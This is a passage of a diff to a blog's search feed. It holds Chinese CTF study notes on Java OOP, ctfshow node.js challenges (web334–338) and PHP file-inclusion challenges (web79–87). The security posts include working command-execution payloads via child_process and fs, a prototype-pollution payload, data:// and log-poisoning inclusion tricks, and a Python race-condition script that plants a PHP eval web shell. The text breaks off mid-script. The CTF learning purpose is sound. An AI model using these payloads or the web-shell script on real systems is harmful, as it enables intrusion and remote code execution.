<span class="type">ADHero</span> <span class="variable">orxiain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ADHero</span>();</span><br><span class="line">		<span class="type">ADHero</span> <span class="variable">boogipop</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ADHero</span>();</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">		ewoji.name = <span class="string">&quot;ewoji&quot;</span>;</span><br><span class="line">		chaospeo.name= <span class="string">&quot;chaospeo&quot;</span>;</span><br><span class="line">		orxiain.name = <span class="string">&quot;orxianin&quot;</span>;</span><br><span class="line">		boogipop.name = <span class="string">&quot;boogipop&quot;</span>;</span><br><span class="line">		</span><br><span class="line">		ewoji.attack(ewoji,chaospeo,orxiain,boogipop);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="饿汉式单例模式"><a href="#饿汉式单例模式" class="headerlink" title="饿汉式单例模式"></a>饿汉式单例模式</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GiantDragon</span> &#123;</span><br><span class="line">	</span><br><span class="line">	<span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;龙王&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="type">double</span> <span class="variable">hp</span> <span class="operator">=</span> <span class="number">1000.0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="type">double</span> <span class="variable">Armor</span> <span class="operator">=</span> <span class="number">100.0</span>;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="title function_">GiantDragon</span><span class="params">()</span>&#123;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="type">GiantDragon</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GiantDragon</span>();</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> GiantDragon <span class="title function_">getDragon</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> instance;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//----------------------------------------------------//</span></span><br><span class="line">	<span class="comment">//----------------------------------------------------//</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		<span class="type">GiantDragon</span> <span class="variable">one</span> <span class="operator">=</span> GiantDragon.getDragon();</span><br><span class="line">		System.out.println(one.name+one.hp+one.Armor);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里的GiantDragon instance和getDragon()必修都要用static修饰</p>
-<p>前者是为了在不实例化的情况下就把唯一的大龙对象实例化</p>
-<p>后者是为了在不实例化的情况下直接访问这个方法</p>
-<h1 id="懒汉式单例模式"><a href="#懒汉式单例模式" class="headerlink" title="懒汉式单例模式"></a>懒汉式单例模式</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="title function_">GiantDragon</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> GiantDragon instance;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> GiantDragon <span class="title function_">getDragon</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="literal">null</span>==instance)&#123;</span><br><span class="line">			instance = <span class="keyword">new</span> <span class="title class_">GiantDragon</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> instance;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
-
-<p>和饿汉式的区别是，它不会直接加载这个实例instance，而是当你调用getDragon()的时候才会创造这个实例</p>
-<h1 id="利用接口实现类的多态"><a href="#利用接口实现类的多态" class="headerlink" title="利用接口实现类的多态"></a>利用接口实现类的多态</h1><p>Motal接口</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Mortal</span> &#123;</span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">die</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>函数的重写</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">APHero</span> <span class="keyword">extends</span> <span class="title class_">Hero</span> <span class="keyword">implements</span> <span class="title class_">AP</span>,Mortal &#123;</span><br><span class="line">	<span class="comment">//法术平A</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">magicAttack</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;法术平A&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//死</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">die</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="built_in">this</span>.name+<span class="string">&quot;死亡&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>调用</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//杀</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">kill</span><span class="params">(Mortal m)</span>&#123;</span><br><span class="line">    	m.die();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Hero</span> <span class="variable">ewoji</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        <span class="type">ADHero</span> <span class="variable">go</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ADHero</span>();</span><br><span class="line">        go.name = <span class="string">&quot;chaospeo&quot;</span>;</span><br><span class="line">        ewoji.kill(go);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里传入的是一个接口</p>
-<h1 id="子类使用父类的带参初始化方法"><a href="#子类使用父类的带参初始化方法" class="headerlink" title="子类使用父类的带参初始化方法"></a>子类使用父类的带参初始化方法</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//初始化</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">APHero</span><span class="params">(String name,<span class="type">double</span> hp)</span>&#123;</span><br><span class="line">		<span class="built_in">super</span>(name,hp);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="重写equals比较两个对象内容是否相等"><a href="#重写equals比较两个对象内容是否相等" class="headerlink" title="重写equals比较两个对象内容是否相等"></a>重写equals比较两个对象内容是否相等</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hero</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">float</span> hp;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(o <span class="keyword">instanceof</span> Hero)&#123;</span><br><span class="line">            <span class="type">Hero</span> <span class="variable">h</span> <span class="operator">=</span> (Hero) o;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.hp == h.hp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Hero h1= <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        h1.hp = <span class="number">300</span>;</span><br><span class="line">        Hero h2= <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        h2.hp = <span class="number">400</span>;</span><br><span class="line">        Hero h3= <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        h3.hp = <span class="number">300</span>;</span><br><span class="line">         </span><br><span class="line">        System.out.println(h1.equals(h2));</span><br><span class="line">        System.out.println(h1.equals(h3));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>如果不重写的话，Object的只会比较两个对象的引用是否指向一个对象</p>
-<h1 id="利用非静态内部类和静态内部类服务外部类"><a href="#利用非静态内部类和静态内部类服务外部类" class="headerlink" title="利用非静态内部类和静态内部类服务外部类"></a>利用非静态内部类和静态内部类服务外部类</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//分数类,非静态，可访问外部类变量</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">BattleScore</span>&#123;</span><br><span class="line">    	<span class="type">int</span> kill;</span><br><span class="line">    	<span class="type">int</span> die;</span><br><span class="line">    	<span class="type">int</span> assit;</span><br><span class="line">    	</span><br><span class="line">    	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">legendary</span><span class="params">()</span>&#123;</span><br><span class="line">    		<span class="keyword">if</span>(kill &gt; <span class="number">8</span>)</span><br><span class="line">    			System.out.println(name+<span class="string">&quot;超神！&quot;</span>);</span><br><span class="line">    		<span class="keyword">else</span></span><br><span class="line">    			System.out.println(name+<span class="string">&quot;尚未超神&quot;</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//水晶类,静态,不可访问外部类变量</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EnemyCrystal</span>&#123;</span><br><span class="line">    	<span class="type">int</span> <span class="variable">hp</span> <span class="operator">=</span> <span class="number">5000</span>;</span><br><span class="line">    	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkIfVictory</span><span class="params">()</span>&#123;</span><br><span class="line">    		<span class="keyword">if</span>(hp==<span class="number">0</span>)&#123;</span><br><span class="line">    			Hero.battleWin();</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="转换为字符串的两种方法"><a href="#转换为字符串的两种方法" class="headerlink" title="转换为字符串的两种方法"></a>转换为字符串的两种方法</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//使用String类的静态方法valueOf()转化</span><br><span class="line">		int go = 222222;</span><br><span class="line">		String str = String.valueOf(go);</span><br><span class="line"></span><br><span class="line">		//使用Obeject类的方法toString()转化</span><br><span class="line">		Integer it = go;</span><br><span class="line">		String go1 = it.toString();</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>学习</category>
-      </categories>
-      <tags>
-        <tag>java</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>XXE漏洞学习</title>
     <url>/2024/02/27/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h1 id="基于xml文档使用中产生的漏洞"><a href="#基于xml文档使用中产生的漏洞" class="headerlink" title="基于xml文档使用中产生的漏洞"></a>基于xml文档使用中产生的漏洞</h1><span id="more"></span>
@@ -307,117 +307,80 @@
       </tags>
   </entry>
   <entry>
-    <title>node.js原型链污染</title>
-    <url>/2024/03/11/node-js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
-    <content><![CDATA[<h1 id="好东西"><a href="#好东西" class="headerlink" title="好东西"></a>好东西</h1><span id="more"></span>
+    <title>nodejs-ctfshow</title>
+    <url>/2024/03/02/nodejs-ctfshow/</url>
+    <content><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><span id="more"></span>
 
-<h1 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h1><p>原型链污染其实就是围绕着两个属性做文章</p>
-<p>属性<code>__proto__</code></p>
-<p>属性<code>prototype</code></p>
-<h2 id="从用法角度介绍"><a href="#从用法角度介绍" class="headerlink" title="从用法角度介绍"></a>从用法角度介绍</h2><p>试想一些通用的方法，我们是如何调用的呢，如<code>toString()</code></p>
-<p>我们在nodejs命令执行中写过一个</p>
-<p>payload:eval&#x3D;require(‘child_process’).spawnSync(‘tac’,[‘fl001g.txt’]).stdout.toString()</p>
-<p>那时我上官网文档里查看了一下child_process类中并没有toString()方法</p>
-<p>那它哪来的呢？</p>
-<h2 id="proto-和prototype"><a href="#proto-和prototype" class="headerlink" title="__proto__和prototype"></a><code>__proto__</code>和prototype</h2><p>首先这两都是属性，都是默认内置在每个对象当中</p>
-<p>prototype指向一个原型对象，这个对象很基础，包含了很多通用的方法和属性，比如刚刚的<code>toString()</code></p>
-<p><code>__proto__</code>则指向object.prototype，实际上也是指向原型对象</p>
-<p>问题还没解答，那toString()怎么用的呢?</p>
-<p>这就要说一下prototype的一些机制，当调用一个对象中的属性和方法时，先是在对象中寻找，若有则用，若无则去prototype指向的原型的对象中去找.</p>
-<p>以下为实验</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240311164432778.png"  alt="image-20240311164432778"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240311164445047.png"  alt="image-20240311164445047"></p>
-<p>可见b对象虽为空，但还是输出了go中的2</p>
-<p>到这里理论已经形成，下面看看实战</p>
-<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h1 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h1><p>题目给了源码，快进到路由中的login.js</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240311165617963.png"  alt="image-20240311165617963"></p>
-<p>要求:让secert(作者是故意还是不小心打错的)中的ctfshow等于36dboy即可输出flag</p>
-<p>很容易就想到了原型链污染，在原型对象中注入一个ctfshow:36dboy即可</p>
-<p>那注入点在哪？</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240311170233201.png"  alt="image-20240311170233201"></p>
-<p>这里搞了个什么处理，打开utils中的common.js康康</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240311170337591.png"  alt="image-20240311170337591"></p>
-<p>真是炸炸又刚刚啊，简单介绍一下就是把我们写入的数据copy到了user对象中</p>
-<p>详细解释:</p>
-<p>1.传入两个对象，一个是user,一个是req.body,req.body由我们所控</p>
-<p>2.定义一个key不断读取req.body中的键名</p>
-<p>3.如果这个键名在user中存在，则继续调用copy，如果不存在则在则让user创建一个和key同名的键名，并且存储和req.body中相同的键值</p>
-<p>4.key读完了自动就跳出循环了</p>
-<p>抓个包看看它咋写</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240311171328658.png"  alt="image-20240311171328658"></p>
-<p><code>payload:&#123;&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;</code></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240311172433837.png"  alt="image-20240311172433837"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240311172445135.png"  alt="image-20240311172445135"></p>
-<p>带出来了</p>
+<h1 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h1><p>给了两个源码文件和一个登录界面</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240303111933863.png"  alt="image-20240303111933863"></p>
+<p>前端可以看到的，以post数据提交用户名和密码，以json格式接受返回数据</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240303112015481.png"  alt="image-20240303112015481"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240303112028812.png"  alt="image-20240303112028812"></p>
+<p>这里给了用户名和密码，然后看了一下登录检验</p>
+<p>用户名不能为CTFSHOW，输入的用户名会经过<code>toUpperCase()</code>转化为大写后与数据比较，密码正常比较。</p>
+<p>既然会转化为大写，直接输入ctfshow(小写)即可</p>
+<h1 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h1><p>题面</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240303124252606.png"  alt="image-20240303124252606"></p>
+<p>信息收集</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240303124304897.png"  alt="image-20240303124304897"></p>
+<p>抓包扫描后无果</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240303124335586.png"  alt="image-20240303124335586"></p>
+<p>传入eval&#x3D;1，出现回显，推测为console.log(传参)，反正能执行我的命令并且输出</p>
+<p>在nodejs中执行系统命令我们主要是使用child_process类</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240304175348635.png"  alt="image-20240304175348635"></p>
+<p>可以看到这里有很多方法，有同步和异步创建进程的分类，我们这里需要的是异步创建进程，这里还不是很理解为什么同步创建进程不会有回显(大概是因为主程序没结束，子进程没有执行？)</p>
+<p>先看<code>execSync()</code></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240304180214603.png"  alt="image-20240304180214603"></p>
+<p>官方文档看得不是很懂，希望以后有机会研读</p>
+<p>总之应对这题，只需要一个参数command足以</p>
+<p>payload:eval&#x3D;require(‘child_process’).execSync(‘ls’)</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240304180415820.png"  alt="image-20240304180415820"></p>
+<p>发现flag文件，改命令查看即可</p>
+<h1 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h1><p>这题相比上题，ban掉了exec，所以我们用另一个spawn</p>
+<h2 id="第一种方法spwanSync"><a href="#第一种方法spwanSync" class="headerlink" title="第一种方法spwanSync()"></a>第一种方法spwanSync()</h2><p>payload1:<code>eval=require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;).stdout.toString()</code></p>
+<p>payload2:<code>eval=require(&#39;child_process&#39;).spawnSync(&#39;tac&#39;,[&#39;fl001g.txt&#39;]).stdout.toString()</code></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240305181344645.png"  alt="image-20240305181344645"></p>
+<p>学习一下<code>spawnSync()</code>方法</p>
+<p><code>spawnSync()</code>会同步创建一个子进程执行我们传入的命令，并且返回一个对象.</p>
+<h3 id="传入命令"><a href="#传入命令" class="headerlink" title="传入命令"></a>传入命令</h3><p>第一个参数是命令的名称</p>
+<p>第二个参数是一个数组，用来传递命令的参数</p>
+<h3 id="返回的对象"><a href="#返回的对象" class="headerlink" title="返回的对象"></a>返回的对象</h3><p>返回的这个对象包含命令执行后的信息</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240305182634001.png"  alt="image-20240305182634001"></p>
+<p>这里我们需要的是标准输出流stdout，并用toString()将它转化为字符串即可输出</p>
+<h2 id="第二种方法-fs类"><a href="#第二种方法-fs类" class="headerlink" title="第二种方法 fs类"></a>第二种方法 fs类</h2><h3 id="两个魔术变量"><a href="#两个魔术变量" class="headerlink" title="两个魔术变量"></a>两个魔术变量</h3><p>__filename:返回当前模块文件被解析过后的绝对路径</p>
+<p>__dirname:返回当前模块文件解析后所在的文件夹的绝对路径</p>
+<h3 id="readdirSync和readFileSync"><a href="#readdirSync和readFileSync" class="headerlink" title="readdirSync和readFileSync"></a>readdirSync和readFileSync</h3><p>payload1:<code>eval=require(&#39;fs&#39;).readdirSync(&#39;.&#39;)</code>查看当前目录下的文件</p>
+<p>payload2:<code>eval=require(&#39;fs&#39;).readFileSync(&#39;fl001g.txt&#39;,&#39;utf-8&#39;)</code>查看文件</p>
+<h3 id="exec绕过"><a href="#exec绕过" class="headerlink" title="exec绕过"></a>exec绕过</h3><p>payload:?<code>eval=require(&#39;child_process&#39;)[&#39;exe&#39;+&#39;cSync&#39;](&#39;ls&#39;).toString()</code></p>
+<p>这里有个疑点，如果我想读取上一层目录的文件该如何处理,以后再想吧</p>
+<h1 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240305201256890.png"  alt="image-20240305201256890"></p>
+<p>要求，传入两个数ab</p>
+<p>1.a的长度和b的长度一致</p>
+<p>2.a不等于b</p>
+<p>3.md5编码后的a+flag和b+flag相等</p>
+<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>这里我们的payload为a[]&#x3D;1&amp;b[]&#x3D;1</p>
+<p>1.数组.length即数组元素个数，满足相等</p>
+<p>2.JavaScript会比较等号两边数组的地址，弱不一样直接返回false(但是php不会)</p>
+<p>3.上本地测试图</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240305202533805.png"  alt="image-20240305202533805"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240305202543607.png"  alt="image-20240305202543607"></p>
+<p>ok了</p>
+<p>再看看如果数组里面有两个元素呢</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240305202622579.png"  alt="image-20240305202622579"></p>
+<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>payload:a[‘x’]&#x3D;1&amp;b[‘x’]&#x3D;1</p>
+<p>原理与上差不多相同，不过输出的东西不太同</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240305203029034.png"  alt="image-20240305203029034"></p>
+<h1 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h1><p>原型链污染</p>
+<p>移步下一篇文章</p>
 ]]></content>
       <categories>
         <category>学习</category>
       </categories>
       <tags>
-        <tag>学习</tag>
-        <tag>js</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件包含漏洞</title>
-    <url>/2024/03/13/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<p>开</p>
-<span id="more"></span>
-
-<h1 id="web-79"><a href="#web-79" class="headerlink" title="web 79"></a>web 79</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240313101524315.png"  alt="image-20240313101524315"></p>
-<p><code>file=data://plain/text,&lt;?= &#39;tac flag.php&#39;?&gt;</code><?echo 1?>等于<?= 1?>,需要打开short_open_tag</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span><br><span class="line">PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===&gt; &lt;?php system(&#x27;cat flag.php&#x27;);</span><br></pre></td></tr></table></figure>
-
-<h1 id="web-80"><a href="#web-80" class="headerlink" title="web 80"></a>web 80</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240313111931278.png"  alt="image-20240313111931278"></p>
-<p>新姿势，包含目录文件</p>
-<p>目录文件会记录我们的ua，浏览器的一些信息，那我们在ua插入php代码，再让include包含并执行，就可以getshell，先包含</p>
-<p>Nginx:&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
-<p>Apache:&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log</p>
-<p>或许还可以试试有没有error.log</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240313111318671.png"  alt="image-20240313111318671"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240313111708459.png"  alt="image-20240313111708459"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240313111721356.png"  alt="image-20240313111721356"></p>
-<p>得吃</p>
-<p>当然你也可以让file包含你服务器的木马文件，然后直接上线它的服务器也可以</p>
-<h1 id="web-81"><a href="#web-81" class="headerlink" title="web 81"></a>web 81</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240313111952192.png"  alt="image-20240313111952192"></p>
-<p>多过滤了一个:</p>
-<p>和上题一样，不能请求自己服务器的木马而已</p>
-<h1 id="web-82-86"><a href="#web-82-86" class="headerlink" title="web 82-86"></a>web 82-86</h1><p><a href="https://blog.csdn.net/qq_46918279/article/details/120106832">CTFSHOW-文件包含_highlight_file(<strong>file</strong>);-CSDN博客</a></p>
-<p>进行一个新知识的学</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"> </span><br><span class="line">url=<span class="string">&#x27;http://08d4a04e-19b3-4049-8a81-e9c6226eee2f.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line"><span class="comment">#设置PHPSESSID的值</span></span><br><span class="line">sessionid=<span class="string">&#x27;ctfshow&#x27;</span>     </span><br><span class="line">data=&#123;<span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/tao.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span>&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#为了进行条件竞争，需要一边写一边读</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#进行上传文件时需要post传递名为PHP_SESSION_UPLOAD_PROGRESS值为一句话木马</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">	fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)          <span class="comment">#生产一个50k的文件</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		response=session.post(url,</span><br><span class="line">			data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>&#125;,</span><br><span class="line">			cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid&#125;,</span><br><span class="line">			files=&#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;ctfshow.jpg&#x27;</span>,fileBytes)&#125;    <span class="comment">#设置文件名字和内容</span></span><br><span class="line">			)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#读取session文件，这里文件为/tmp/sess_ctfshow</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		response=session.post(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,data=data)</span><br><span class="line">		response2=session.get(url+<span class="string">&#x27;tao.php&#x27;</span>);</span><br><span class="line">		<span class="keyword">if</span> response2.status_code==<span class="number">200</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;++++++++++++++++++++&#x27;</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(response2.status_code)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> </span><br><span class="line">	<span class="comment">#开启多线程进行竞争	</span></span><br><span class="line">	evnet=threading.Event()</span><br><span class="line">	<span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:			</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">			threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">			threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">	evnet.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="web-87"><a href="#web-87" class="headerlink" title="web 87"></a>web 87</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240316125758740.png"  alt="image-20240316125758740"></p>
-<p>这题目的是写入木马，并成功执行木马</p>
-<p>分析一波:</p>
-<p>这里的文件名中不能有php，data，：，.</p>
-<p>并且木马写上去后还会先执行死亡程序，不会执行木马</p>
-<p>该怎么做</p>
-<p>先要了解一下<code>php://filter/write=convert.base64-decode/resouce=flag.php</code></p>
-<p>这里是打开一个中间流，如果我们在文件名那里写上这个的话，那么<code>file_put_contents()</code>会这样做，把第二个参数的值以base64解码，并且写到flag.php文件中，接下来就介绍如何突破限制</p>
-<h2 id="文件名"><a href="#文件名" class="headerlink" title="文件名"></a>文件名</h2><p>既然我们要写上上面的payload，那么该如何绕过，可以看到下面还有一层url解码，所以这里可以双重url编码绕过，自己用python写了个脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">payload = <span class="built_in">input</span>(<span class="string">&quot;your payload:[+]&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">twencode</span>(<span class="params">payload</span>):</span><br><span class="line">    res=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    chars = <span class="built_in">list</span>(payload)</span><br><span class="line">    length = <span class="built_in">len</span>(payload)</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        asc = <span class="built_in">ord</span>(char)</span><br><span class="line">        x0 = <span 